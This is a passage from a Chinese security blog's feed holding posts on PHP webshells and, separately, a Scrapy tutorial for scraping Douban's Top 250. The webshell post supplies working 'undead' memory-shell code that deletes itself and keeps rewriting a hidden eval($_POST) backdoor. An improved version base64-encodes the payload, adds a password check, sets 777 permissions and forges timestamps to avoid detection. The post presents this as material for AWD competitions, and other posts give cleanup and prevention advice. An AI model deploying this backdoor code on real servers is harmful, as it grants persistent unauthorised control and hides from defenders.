.shell.php; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></li><li><p>清除进程<br> 不断地删除程序以及杀死进程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">         <span class="variable">$pid</span>=xxx;                   <span class="comment"># 进程号</span></span><br><span class="line">         @unlink(<span class="string">&#x27;shell.php&#x27;</span>); </span><br><span class="line">         exec(<span class="string">&#x27;kill -9 $pid&#x27;</span>);       <span class="comment"># 强制清除进程</span></span><br><span class="line">         usleep(<span class="number">1000</span>);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></div></div><h1 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h1><p>通常，黑客会利用Web服务器软件中存在的漏洞来安装webShell。 因此，消除这些漏洞对于避免失陷Web服务器的潜在风险很重要。<br>以下是一些与webShell相关的预防措施。</p><ol><li><p>如果不使用，要禁用危险的PHP函数，例如<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>system()</code>、<code>show_source()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>eval()</code>与<code>assert()</code>。</p></li><li><p>如果必须要启用这些命令，请确保未授权用户无法访问这些脚本。此外，使用<code>escapeshellarg()</code>和<code>escapeshellcmd()</code>可以确保不能将用户输入注入到shell命令中，从而导致命令执行漏洞。</p></li><li><p>如果Web应用程序正在使用上传表单，请确保上传的表单是安全的，并且仅允许上传<code>白名单</code>所允许的文件类型。</p></li><li><p>不要相信用户输入的信息。</p></li><li><p>不要盲目使用在线论坛或网站上的代码。</p></li><li><p>对于<code>WordPress</code>，如果不需要，要<code>避免</code>安装第三方插件。如果需要使用插件，请确保插接件其信誉良好且经常更新。</p></li><li><p>在敏感目录（如图片或上传）中<code>禁用</code>PHP执行。</p></li><li><p><code>锁定</code>Web服务器用户权限。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShell（2）| 内存马（不死马）</title>
      <link href="/posts/8a6b0e5b/"/>
      <url>/posts/8a6b0e5b/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h1><p>内存马是<code>无文件攻击</code>的一种常用手段，随着攻防演练热度越来越高：攻防双方的博弈，流量分析、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webShell或以文件形式驻留的后门越来越容易被检测到，内存马使用越来越多。</p><p>webShell内存马，是在<code>内存中</code>写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的<code>对外窗口</code>：网站、应用。<br>但传统的webShell都是<code>基于文件类型</code>的，攻击者可以利用上传工具或网站漏洞植入木马。<br>而其中的区别在于webShell内存马是<code>无文件马</code>，利用<code>中间件</code>的<code>进程</code>执行某些恶意代码，不会有文件落地，给检测带来巨大难度。</p><div class="note info flat"><p>Java内存马可参考文章——<a href="https://www.freebuf.com/articles/web/274466.html">一文看懂内存马</a></p></div><h1 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h1><p>PHP内存马，也叫做PHP不死马、不死僵尸，在线下AWD比赛中是常用手段之一，用于<code>权限维持</code>。<br>在蚁剑中也有专门的插件可以一键注入内存马。原理也很简单，相对于Java可以直接把整个shell写入内存，php内存马的实现则是将一个木马反复写入，达到<code>无法删除</code>的目的。</p><p>不死马原型如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);                   <span class="comment">//设置客户端断开连接时是否中断脚本的执行</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);                         <span class="comment">//设置脚本最大执行时间，linux下可能不大好用</span></span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);                           <span class="comment">//删除当前文件本身，以起到隐蔽自身的作用</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;                        <span class="comment">//文件名</span></span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;    <span class="comment">//恶意代码</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);     <span class="comment">//打开file文件，然后写入code</span></span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">100</span>);                             <span class="comment">//延迟执行可有可无</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>上传之后,访问该页面，就会不断生成<code>shell.php</code>，我们就直接可以利用<code>shell.php</code><br>但是原型有一个<code>缺点</code>：while里面只是判断了这个文件是否存在, 那么只要把文件中的shell注释掉就可以绕过你的内存木马了。</p><h1 id="木马改进"><a href="#木马改进" class="headerlink" title="木马改进"></a>木马改进</h1><p>在原型的基础上，我们可以进行改进一下</p><ol><li><p>在文件前面加个点<code>.</code>在Linux系统中变成<code>隐藏文件</code>，用来隐蔽自己</p></li><li><p>为了<code>防止</code>被其他人利用，可以对<code>恶意代码</code>进行修改，用<code>md5</code>加密验证，或者其他利用方法验证，只要不让其他人搭顺风车都可以</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$_GET</span>[<span class="string">&quot;pwd&quot;</span>]) == <span class="string">&quot;9003d1df22eb4d3820015070385194c8&quot;</span>)&#123;      </span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>密码为pwd，只有参数<code>pwd</code>正确时，才可使用<code>cmd</code>参数</p></li><li><p>对<code>恶意代码</code>进行一个<code>base编码</code>，绕过简单查杀</p></li><li><p>修改if语句内的判断，改为<code>md5加密的内容匹配</code></p></li><li><p>赋予木马文件<code>最高</code>权限<code>777</code></p></li><li><p>设置修改木马文件的<code>修改时间</code></p></li></ol><p>改进后示例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.shell.php&#x27;</span>;                                   </span><br><span class="line">    <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgCiAgICAgICAgaWYobWQ1KCRfR0VUWyJwd2QiXSkgPT0gIjkwMDNkMWRmMjJlYjRkMzgyMDAxNTA3MDM4NTE5NGM4Iil7ICAgICAgCiAgICAgICAgICAgIEBldmFsKCRfUkVRVUVTVFtjbWRdKTsKICAgICAgICB9IAogICAgPz4=&#x27;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>)) !== md5(<span class="variable">$code</span>)) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&#x27;chmod 777 &#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">        touch(<span class="variable">$file</span>, mktime(hour, minute, second, month, day, year));</span><br><span class="line">        usleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><div class="note warning flat"><p>以上都是一些思路，若还有其他补充的还请大佬赐教，可用于Awd比赛，切勿用于不法之地！</p></div></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShell（1）| 基础详解</title>
      <link href="/posts/510672c5/"/>
      <url>/posts/510672c5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note default flat"><p>前段时间忙着项目，awd比赛等，都没怎么写博客，不是没学，是不知道写啥。<br>好了，话不多说，2022年的第一篇博客。</p></div><h1 id="WebShell基础"><a href="#WebShell基础" class="headerlink" title="WebShell基础"></a>WebShell基础</h1><h2 id="什么是WebShell"><a href="#什么是WebShell" class="headerlink" title="什么是WebShell?"></a>什么是WebShell?</h2><p>顾名思义，<code>web</code>的含义是显然需要服务器开放web服务，<code>shell</code>的含义是取得对服务器某种程度上操作权限。<br>webShell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webShell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p><p>webShell就是以<code>asp</code>、<code>php</code>、<code>jsp</code>或者<code>cgi</code>等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。</p><p><code>入侵者</code>在入侵了一个网站后，通常会将asp或php后门文件与网站目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到<code>控制网站服务器</code>的目的。</p><div class="note primary flat"><p><code>Shell</code>是一个人机交互页面，能操控服务器并获取权限。</p></div><p><code>Shell</code>文件有个变态的地方，就是可从服务器那边接收数据并执行、返回结果，也就是说只要把shell文件上传到目标服务器，就能操控服务器了。</p><div class="note warning no-icon flat"><p>利用webShell可以在Web服务器上执行系统命令、窃取数据、植入病毒、勒索核心数据、SEO挂马等恶意操作，危害极大。</p></div><h2 id="WebShell的特点"><a href="#WebShell的特点" class="headerlink" title="WebShell的特点"></a>WebShell的特点</h2><p><code>入侵者</code>使用webShell的第一步通常是将其上传到可访问的服务器中，例如利用用户CMS系统的第三方插件中的漏洞上传一个简单的php webShell。</p><p>当然，webShell类型和作用也不完全相同<br>一些简单的webShell只起到连接外界的作用，允许入侵者插入更加精准的恶意脚本，执行他们所需要的指令；<br>另外一些则可能更加复杂，带有数据库或文件浏览器，让入侵者能够从数千英里之外的地方查看入侵系统的代码和数据。</p><div class="note danger flat"><p>无论何种设计，webShell都极其危险，是网络罪犯和高级持续威胁(APTs)的常用工具。</p></div><p>webShell常见的攻击特点主要有以下几点：</p><ol><li><p>持久化远程访问<br>webShell脚本通常会包含后门，入侵者上传webShell之后，就可以充分利用webShell的<code>后门</code>实现<code>远程访问并控制服务器</code>，从而达到长期控制网站服务器的目的。<br>此外，在上传完webShell之后，入侵者会选择自己修复漏洞，以确保没有其他人会利用该漏洞。<br>通过这种方式，入侵者就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p></li><li><p>提权<br>在服务器没有配置错误的情况下，webShell将在web服务器的用户权限下运行，而用户权限是有限的。<br>通过webShell，入侵者可以利用系统上的本地漏洞来实现权限提升，从而获得Root权限，这样入侵者基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p></li><li><p>隐蔽性极强<br>webShell可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制的服务器或远程主机交互的数据都是通过80端口传递，因此不会被防火墙拦截。<br>在没有记录流量的情况下，webShell使用post包发送，也不会被记录在系统日志中，只会在Web日志中记录一些数据提交的记录。</p></li></ol><h2 id="WebShell的分类"><a href="#WebShell的分类" class="headerlink" title="WebShell的分类"></a>WebShell的分类</h2><p>webShell根据脚本可以分为<code>php</code>脚本木马，<code>asp</code>脚本木马，<code>jsp</code>脚本木马，也有基于<code>.NET</code>的脚本木马。</p><p>根据时代和技术的变迁，也有用<code>python</code>和<code>lua</code>编写的脚本木马，常用有如下几种：</p><ol><li><p>大马 </p><ul><li>体积大，功能全 </li><li>会调用系统关键函数 </li><li>以代码加密进行隐藏</li><li>一般入侵者会设置密码进入</li></ul></li><li><p>小马 </p><ul><li>体积小，功能少 </li><li>一般只有一个上传功能，用于上传大马</li></ul></li><li><p>一句话木马 </p><ul><li>代码短 使用场景大，</li><li>可单独生成文件，可插入文件 </li><li>安全性高，隐藏性强，可变形免杀 </li><li>框架不变，数据执行，数据传递</li></ul><div class="note purple icon flat"><i class="note-icon far fa-hand-scissors"></i><p>对一句话木马的具体详细讲解可参考下面大佬的文章：<br><a href="https://www.kitsch.live/2020/12/25/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e2%91%a0%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac/">WebShell①一句话木马</a><br><a href="https://www.uedbox.com/post/6051/">那些强悍的PHP一句话后门</a><br>写得很好，就不班门弄斧了嘻嘻</p></div></li><li><p>打包马 </p><ul><li>主要用于打包网站源码</li></ul></li><li><p>拖库马 </p><ul><li>主要用于导出网站数据库</li></ul></li><li><p>内存马（也叫不死马） </p><ul><li>无文件落地 </li><li>极难检测和发现 </li><li>难以清除</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫框架</title>
      <link href="/posts/8386228b/"/>
      <url>/posts/8386228b/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Scrapy框架概念"><a href="#Scrapy框架概念" class="headerlink" title="Scrapy框架概念"></a>Scrapy框架概念</h2><p><code>Scrapy</code>是一个Python编写的开源网络爬虫框架。它是一个被设计用于爬取网络数据、提取结构性数据的框架。</p><p>Scrapy文档地址：<a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/overview.html">http://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/overview.html</a></p><h2 id="Scrapy框架作用"><a href="#Scrapy框架作用" class="headerlink" title="Scrapy框架作用"></a>Scrapy框架作用</h2><p>少量的代码，就能够快速的抓取。一般用于爬取大量数据。</p><h2 id="Scrapy框架工作流程"><a href="#Scrapy框架工作流程" class="headerlink" title="Scrapy框架工作流程"></a>Scrapy框架工作流程</h2><ol><li><p>回顾request的爬虫流程</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/原始的爬虫流程.1a7d9jv58bmo.jpg" alt="原始的爬虫流程"></p><p>我们可以在此基础上改写流程：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/改写的爬虫流程.ef49avaji3k.png" alt="改写的爬虫流程"></p><p>而上面改写的流程图也更加便于大家去理解scrapy的流程</p></li><li><p>Scapy的流程</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/scapy的流程.2rcpyfhjjoo0.png" alt="scapy的流程"></p><h3 id="其流程详细如下："><a href="#其流程详细如下：" class="headerlink" title="其流程详细如下："></a>其流程详细如下：</h3><ol><li>爬虫中起始的url构造成request对象——&gt;爬虫中间件——&gt;引擎——&gt;调度器</li><li>调度器把request——&gt;引擎——&gt;下载中间件——&gt;下载器 </li><li>下载器发送请求，获取response响应——&gt;下载中间件——&gt;引擎——&gt;爬虫中间件——&gt;爬虫 </li><li>爬虫提取url地址，组装成request对象——&gt;爬虫中间件——&gt;引擎——&gt;调度器，重复步骤2 </li><li>爬虫提取数据——&gt;引擎——&gt;管道处理和保存数据</li></ol></li></ol><div class="note warning no-icon flat"><p>​    注意：</p><ul><li>图中绿色线条的表示数据的传递</li><li>注意图中中间件的位置，决定了其作用</li><li>注意其中引擎的位置，所有的模块之前相互独立，只和引擎进行交互</li></ul></div><h2 id="各模块的具体作用"><a href="#各模块的具体作用" class="headerlink" title="各模块的具体作用"></a>各模块的具体作用</h2><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/各模块作用.5z8n2kdpqtw0.jpg" alt="各模块作用"></p><p>​    各模块功能：</p><ul><li>引擎 —— 数据和信号的传递</li><li>调度器 —— 任务url队列</li><li>下载器 —— 发送请求、获取响应</li><li>爬虫 —— 起始的url、解析数据</li><li>管道 —— 保存数据</li><li>中间件 —— 定制化操作</li></ul><h2 id="三个内置对象"><a href="#三个内置对象" class="headerlink" title="三个内置对象"></a>三个内置对象</h2><ul><li>request请求对象：由url、method、post_data、headers等构成 </li><li>response响应对象：由url、body、status、headers等构成 </li><li>item数据对象：本质是个字典</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>有时pip版本过于老旧不能使用，需要升级pip版本，输入<code>pip install --upgrade pip</code>回车，升级成功</p><p>安装scrapy命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip/pip3 install Scrapy</span><br></pre></td></tr></table></figure><h2 id="scrapy项目开发流程"><a href="#scrapy项目开发流程" class="headerlink" title="scrapy项目开发流程"></a>scrapy项目开发流程</h2><ol><li>创建项目</li><li>生成一个爬虫</li><li>提取数据</li><li>保存数据</li></ol><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>创建scrpy项目的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject &lt;项目名字&gt;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject myspider</span><br></pre></td></tr></table></figure><h2 id="创建爬虫"><a href="#创建爬虫" class="headerlink" title="创建爬虫"></a>创建爬虫</h2><div class="note info flat"><p>通过命令创建出爬虫文件，爬虫文件为主要的代码作业文件，通常一个网站的爬取动作都会在爬虫文件中进行编写。</p></div><p>命令：在<strong>项目路径下</strong>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider &lt;爬虫名字&gt; &lt;允许爬取的域名&gt;</span><br></pre></td></tr></table></figure><ul><li>爬虫名字：作为爬虫运行时的参数</li><li>允许爬取的域名：为对于爬虫设置的爬取范围，设置之后用于过滤要爬取的url，如果爬取的url与允许的域不通则被过滤掉。如不确定时，可以设置xx.com，后期再进行修改。</li></ul><p>这里我们以<code>豆瓣电影Top250</code>作为示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd myspider</span><br><span class="line">scrapy genspider douban movie.douban.com</span><br></pre></td></tr></table></figure><p>生成的目录和文件结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/目录文件总览.5z4b3r667x00.jpg" alt="目录文件总览"></p><h2 id="完善爬虫"><a href="#完善爬虫" class="headerlink" title="完善爬虫"></a>完善爬虫</h2><p>在上一步生成出来的爬虫文件中编写指定网站的数据采集操作，实现数据提取</p><p><strong>一、在item.py中定义要提取的字段</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    num = scrapy.Field()<span class="comment"># 电影序号   </span></span><br><span class="line">    name = scrapy.Field()<span class="comment"># 电影名字</span></span><br><span class="line">    score = scrapy.Field()<span class="comment"># 电影评分   </span></span><br><span class="line">    con = scrapy.Field()<span class="comment"># 电影简介</span></span><br></pre></td></tr></table></figure><p><strong>二、在/myspider/myspider/spiders/douban.py 中修改内容如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MyspiderItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># 电影名字</span></span><br><span class="line">        name = response.xpath(<span class="string">&#x27;.//div[@id=&quot;content&quot;]/div/div/ol/li[*]/div/div/div/a/span[1]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 电影评分</span></span><br><span class="line">        score = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]s/ol/li[*]/div/div/div/div/span[3]/@content&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 美化格式</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            <span class="comment">#在爬虫中导入并且实例化对象, 使用方法跟使用字典类似</span></span><br><span class="line">            item = MyspiderItem()</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>] = name[i]<span class="comment"># 这里的键名要跟item.py中字段名一致</span></span><br><span class="line">            item[<span class="string">&#x27;score&#x27;</span>] = score[i]</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            <span class="keyword">yield</span> item      <span class="comment"># yield 会把数据传给管道</span></span><br></pre></td></tr></table></figure><div class="note warning no-icon flat"><p>注意：</p><ul><li>scrapy.Spider爬虫类中必须有名为parse的解析</li><li>如果网站结构层次比较复杂，也可以自定义其他解析函数</li><li>在解析函数中提取的url地址如果要发送请求，则必须属于allowed_domains范围内，但是start_urls中的url地 址不受这个限制，我们会在后续的课程中学习如何在解析函数中构造发送请求</li><li>启动爬虫的时候注意启动的位置，是在项目路径下启动</li><li>parse()函数中使用yield返回数据，注意：解析函数中的yield能够传递的对象只能是：BaseItem, Request, dict, None</li></ul></div><p><strong>三、定位元素以及提取数据、属性值的方法</strong></p><div class="note info flat"><p>解析并获取scrapy爬虫中的数据: 利用xpath规则字符串进行定位和提取</p></div><ol><li><p>response.xpath方法的返回结果是一个类似list的类型，其中包含的是selector对象，操作和列表一样，但是有 一些额外的方法</p></li><li><p>额外方法extract()：返回一个包含有字符串的列表（相当于getall() ）</p></li><li><p>额外方法extract_first()：返回列表中的第一个字符串，列表为空没有返回None（相当于get() ）</p></li></ol><p><strong>四、response响应对象的常用属性</strong></p><ul><li>response.url：当前响应的url地址</li><li>response.request.url：当前响应对应的请求的url地址</li><li>response.headers：响应头</li><li>response.requests.headers：当前响应的请求头 </li><li>response.body：响应体，也就是html代码，byte类型</li><li>response.status：响应状态码</li></ul><p><strong>五、（改进版）可构造Request对象，并发送请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MyspiderItem</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span>     <span class="comment"># 全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># 电影名字</span></span><br><span class="line">        name = response.xpath(<span class="string">&#x27;.//div[@id=&quot;content&quot;]/div/div/ol/li[*]/div/div/div/a/span[1]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 电影评分</span></span><br><span class="line">        score = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/ol/li[*]/div/div/div/div/span[2]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 电影链接</span></span><br><span class="line">        link = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/ol/li[*]/div/div[2]/div[1]/a/@href&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 美化格式</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            item = MyspiderItem()</span><br><span class="line">            <span class="keyword">global</span> num</span><br><span class="line">            <span class="keyword">if</span> num == i:        <span class="comment"># 防止乱序</span></span><br><span class="line">                item[<span class="string">&#x27;num&#x27;</span>] = num+<span class="number">1</span></span><br><span class="line">                item[<span class="string">&#x27;name&#x27;</span>] = name[i]</span><br><span class="line">                item[<span class="string">&#x27;score&#x27;</span>] = score[i]</span><br><span class="line">                <span class="comment"># print(item)</span></span><br><span class="line">                <span class="comment"># yield item      # yield 会把数据传给管道</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># print(link[i])</span></span><br><span class="line">                <span class="comment"># 对获取的电影链接去发送请求</span></span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(link[i], callback=self.parse_data, 